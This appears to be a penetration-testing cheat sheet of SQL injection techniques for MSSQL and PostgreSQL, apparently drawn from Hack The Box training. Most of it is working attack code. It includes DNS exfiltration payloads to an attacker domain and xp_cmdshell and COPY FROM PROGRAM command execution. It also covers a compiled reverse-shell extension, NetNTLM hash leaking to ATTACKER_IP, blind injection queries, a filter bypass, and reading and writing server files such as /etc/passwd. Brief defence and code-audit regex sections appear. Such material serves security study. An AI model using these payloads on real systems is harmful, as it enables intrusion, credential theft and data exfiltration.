# SQL injection

## Out-of-band DNS
### MSSQL
|SQL function|SQL query|
|--|--|
|`master..xp_dirtree`|`DECLARE @T varchar(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_dirtree "\\'+@T+'.YOUR.DOMAIN\\x"');`|
|`master..xp_fileexist`|`DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_fileexist "\\'+@T+'.YOUR.DOMAIN\\x"');`|
|`master..xp_subdirs`|`DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_subdirs "\\'+@T+'.YOUR.DOMAIN\\x"');`|
|`sys.dm_os_file_exists`|`DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM sys.dm_os_file_exists('\\'+@T+'.YOUR.DOMAIN\x');`|
|`fn_trace_gettable`|`DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_trace_gettable('\\'+@T+'.YOUR.DOMAIN\x.trc',DEFAULT);`|
|`fn_get_audit_file`|`DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_get_audit_file('\\'+@T+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);`|
> **Note:** Notice how in all of the above payloads we start by declaring `@T` as `VARCHAR` then add our query within it, and then we add it to the domain. This will become handy later on when we want to split `@T` into multiple strings so it fits as a sub-domain. It is also useful to ensure whatever result we get is a string, otherwise it may break our query.

#### Splitting result
`DECLARE @T VARCHAR(MAX); DECLARE @A VARCHAR(63); DECLARE @B VARCHAR(63); SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), <flag>), 1) from flag; SELECT @A=SUBSTRING(@T,3,63); SELECT @B=SUBSTRING(@T,3+63,63); SELECT * FROM fn_get_audit_file('\\'+@A+'.'+@B+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);`

## RCE
### MSSQL
|Request|Command|
|--|--|
|Check permission|`IS_SRVROLEMEMBER('sysadmin');`|
|Enabling advanced options|`EXEC sp_configure 'Show Advanced Options', '1';RECONFIGURE;`|
|Enabling xp_cmdshell|`EXEC sp_configure 'xp_cmdshell', '1';RECONFIGURE;`|
|ping \<host\>|`EXEC xp_cmdshell 'ping /n 4 <host>';`|

### PostgreSQL
#### `COPY` command
```sql
bluebird=# CREATE TABLE tmp(t TEXT);
CREATE TABLE
bluebird=# COPY tmp FROM PROGRAM 'id';
COPY 1
bluebird=# SELECT * FROM tmp;
                                   t                                    
------------------------------------------------------------------------
 uid=119(postgres) gid=124(postgres) groups=124(postgres),118(ssl-cert)
(1 row)

bluebird=# DROP TABLE tmp;
DROP TABLE
bluebird=# exit
```
##### Permissions
> n order to use COPY for remote code execution, the user must have the `pg_execute_server_program` role, or be a `superuser`.

#### PostgreSQL Extensions
[Code of extension](payloads/psql_extension.md)
To compile this extension, we need to first install the `postgresql-server-dev package` for version **13**:
```bash
[!bash!]$ sudo apt install postgresql-server-dev-13
[!bash!]$ gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c
```
The next step is to upload `pg_rev_shell.so` to the webserver. It doesn't matter how you do this (`COPY` or `Large Objects`), as long as you know the exact path it was uploaded to. Once it's been uploaded, we can run `CREATE FUNCTION` to load the `rev_shell` function from the library into the database and then call it to get a reverse shell.
```sql
bluebird=# CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;
CREATE FUNCTION
bluebird=# SELECT rev_shell('127.0.0.1', 443);
server closed the connection unexpectedly
        This probably means the server terminated abnormally
        before or while processing the request.
```       
After you're done running commands, make sure to clean up after yourself by dropping the function from the database, as well as any large objects you may have created (depending on how you uploaded the library):
 ```sql
 bluebird=# DROP FUNCTION rev_shell;
DROP FUNCTION
bluebird=# SELECT lo_unlink(58017);
 lo_unlink 
-----------
         1
(1 row)
```

##### Permissions
> A user must be either a `superuser`, or have the `CREATE` privilege granted on the `public` schema. Additionally, `C` must have been added as a `trusted` language, since it is untrusted by default for all (non-super) users.

[Automation script](payloads/psql_auto_ext.py)


## Leaking NetNTLM Hashes (MSSQL)
1. Run [responder](https://github.com/lgandx/Responder).
2. Get NTLM hash: `EXEC master..xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1`


## Defending
### MSSQL
1. Don't Run Queries as Sysadmin!

> First and foremost, don't use **sa** to run your queries.

2. Disable Dangerous Functions

## Regex
|Query|Description|
|--|--|
|`SELECT\|UPDATE\|DELETE\|INSERT\|CREATE\|ALTER\|DROP`|Search for the basic SQL commands. Injection can occur in more than just SELECT statements, exploitation may just be a bit trickier.|
|`(WHERE\|VALUES).*?'`|Search for strings which include WHERE or VALUES and then a single quote, which could indicate a string concatenation.|
|`(WHERE\|VALUES).*" \+`|Search for strings which include WHERE or VALUES followed by a double quote and a plus sign, which could indicate a string concatenation.|
|`.*sql.*"`|Search for lines which include sql and then a double quote.|
|`jdbcTemplate`|Search for lines which include jdbcTemplate. There are various ways to interact with SQL databases in Java. JdbcTemplate is one of them; others include JPA and Hibernate.|

## Bypass
### PostgreSQL
|char|alternatives|
|--|--|
|space|`/****/`|
|`'text'`|`$$text$$`|
|`"text"`|`$$text$$`|

## Blind
### PostgreSQL
|Query|Description|
|--|--|
|`' and 0=CAST((SELECT VERSION()) AS INT)--@bluebird.htb`|GEt version of DBMS|
|`' and 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) as INT)--@bluebird.htb`|Get table name from database|
|`' and 1=CAST((SELECT STRING_AGG(table_name,',') FROM information_schema.tables LIMIT 1) as INT)--@bluebird.htb`|Get all tables from DB|
|`';SELECT CAST(CAST(QUERY_TO_XML('SELECT * FROM posts LIMIT 2',TRUE,TRUE,'') AS TEXT) AS INT)--@bluebird.htb`|Stack query: dump entire tables or databases in XML|

## Reading and Writing Files
### MSSQL
If we have the correct permissions, we can read files via an (MS)SQL injection. To do so we can use the [OPENROWSET](https://learn.microsoft.com/en-us/sql/t-sql/functions/openrowset-transact-sql?view=sql-server-ver16) function with a **bulk** operation.

#### Syntax
The syntax looks like this. **SINGLE_CLOB** means the input will be stored as a **varchar**, other options are **SINGLE_BLOB** which stores data as **varbinary**, and **SINGLE_NCLOB** which uses **nvarchar**.


```sql
-- Get the length of a file
SELECT LEN(BulkColumn) FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS x

-- Get the contents of a file
SELECT BulkColumn FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS x
```

#### Checking permissions
```sql
SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name = 'ADMINISTER BULK OPERATIONS' OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS';
```

##### Exploitation (example)
```sql
maria' AND (SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name = 'ADMINISTER BULK OPERATIONS' OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS')>0;--
```

### PostgreSQL
#### `COPY` command
##### Reading files
To read a file from the filesystem, we can use the `COPY FROM` syntax to `copy` data from a file into a table in the database.
```sql
bluebird=# CREATE TABLE tmp (t TEXT);
CREATE TABLE
bluebird=# COPY tmp FROM '/etc/passwd';
COPY 59
bluebird=# SELECT * FROM tmp LIMIT 5;
```
 > One issue with using `COPY` to read files, is that it expects data to be seperated into columns. By default it treats `\t` as a column.
 > To bypass it's possible to use:

`sql COPY tmp FROM '/etc/hosts' DELIMITER E'\x07';`

##### Writing files
Writing files using COPY works very similarly- instead of `COPY FROM` we will use `COPY TO` to copy data from a table into a file. 
```sql
bluebird=# CREATE TABLE tmp (t TEXT);
CREATE TABLE
bluebird=# INSERT INTO tmp VALUES ('To hack, or not to hack, that is the question');
INSERT 0 1
bluebird=# COPY tmp TO '/tmp/proof.txt';
COPY 1
bluebird=# DROP TABLE tmp;
DROP TABLE
bluebird=# exit

mlwrwrk@htb[/htb]$ cat /tmp/proof.txt 
To hack, or not to hack, that is the question
```

##### Permissions
> In order to use COPY to read/write files, the user must either have the `pg_read_server_files / pg_write_server_files` role respectively, or be a `superuser`.

Checking if a user is a superuser is quite straightforward and can be easily tested in blind injection scenarios:
```sql
bluebird=# SELECT current_setting('is_superuser');
 current_setting 
-----------------
 on
(1 row)
```
Checking if a user has a specific role is not so simple. Locally we could run `\du`, but through an injection we would need something like:
```sql
bluebird=# SELECT r.rolname, ARRAY(SELECT b.rolname FROM pg_catalog.pg_auth_members m JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid) WHERE m.member = r.oid) as memberof FROM pg_catalog.pg_roles r WHERE r.rolname='fileuser';
 rolname  |        memberof        
----------+------------------------
 fileuser | {pg_read_server_files}
(1 row)
```

#### Large Objects
##### Reading files
To read a file, we should first use `lo_impor`t to load the file into a new `large object`. This command should return the `object ID` of the large object which we will need to reference later on.
```sql
bluebird=# SELECT lo_import('/etc/passwd');
 lo_import 
-----------
     16513
(1 row)
```
Once the file is imported we should get an `object ID`. The file will be stored in the `pg_largeobjects` table as a hexstring. If the size of the file is larger than **2kb**, the large object will be split up into pages each 2kb large (4096 characters when hex encoded). We can get the contents with `lo_get(<object id>)`:
```sql
bluebird=# SELECT lo_get(16513);
<SNIP>\x726f6f743a783a303a303a726f6f743a2...<SNIP>
```
Alternatively, you can select data directly from `pg_largeobject`, but this requires specifying the page numbers as well:
```sql
bluebird=# SELECT data FROM pg_largeobject WHERE loid=16513 AND pageno=0;
bluebird=# SELECT data FROM pg_largeobject WHERE loid=16513 AND pageno=1;
<SNIP>
```
Once we've obtained the hexstring, we can convert it back using `xxd` like this:
```bash
mlwrwrk@htb[/htb]$ echo 726f6f743<SNIP> | xxd -r -p
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<SNIP>
```
Unfortunately, it's not possible to specify an object ID when creating the large object, so it does make things harder if you are doing this blindly. One thing you could do is select all object IDs from the `pg_largeobject` table and figure out which one is yours:
```sql
bluebird=# SELECT DISTINCT loid FROM pg_largeobject;
 loid  
-------
 16515
(1 row)
```

##### Writing files
> Writing files using large objects is a very similar process. Essentially we will create a large object, insert hex-encoded data 2kb at a time and then export the large object to a file on disk.

First we need to prepare the file we want to upload by splitting it up into 2kb chunks:
```bash
mlwrwrk@htb[/htb]$ split -b 2048 /etc/passwd
mlwrwrk@htb[/htb]$ ls -l
total 8
-rw-r--r-- 1 kali kali 2048 Feb 25 06:52 xaa
-rw-r--r-- 1 kali kali 1328 Feb 25 06:52 xab
```
We'll convert each chunk `(xaa,xab,...)` into hex-strings like this:
```bash
mlwrwrk@htb[/htb]$ xxd -ps -c 99999999999 xaa
726f6f743a783a303a303a726<SNIP>
```
Once that's ready, we can create a `large object` with a known `object ID` with `lo_create`, then insert the hex-encoded data one page at a time into `pg_largeobject`, export the `large object` by `object ID` to a specific path with `lo_export` and then finally delete the object from the database with `lo_unlink`.
```sql
bluebird=# SELECT lo_create(31337);
 lo_create 
-----------
     31337
(1 row)

bluebird=# INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 0, DECODE('726f6f74<SNIP>6269','HEX'));
INSERT 0 1
bluebird=# INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 1, DECODE('6e2f626173<SNIP>96e0a','HEX'));
INSERT 0 1
bluebird=# SELECT lo_export(31337, '/tmp/passwd');
 lo_export 
-----------
         1
(1 row)

bluebird=# SELECT lo_unlink(31337);
 lo_unlink 
-----------
         1
(1 row)

bluebird=# exit

mlwrwrk@htb[/htb]$ head /tmp/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
```
> Depending on user permissions, the `INSERT` queries may fail. In that case you could try using `lo_put`:
```sql
bluebird=# SELECT lo_put(31337, 0, 'this is a test');
 lo_put 
--------
 
(1 row)
```

##### Permissions
> Any user can create or unlink large objects, but importing, exporting or updating the values require the user to either be a superuser, or to have explicit permissions granted.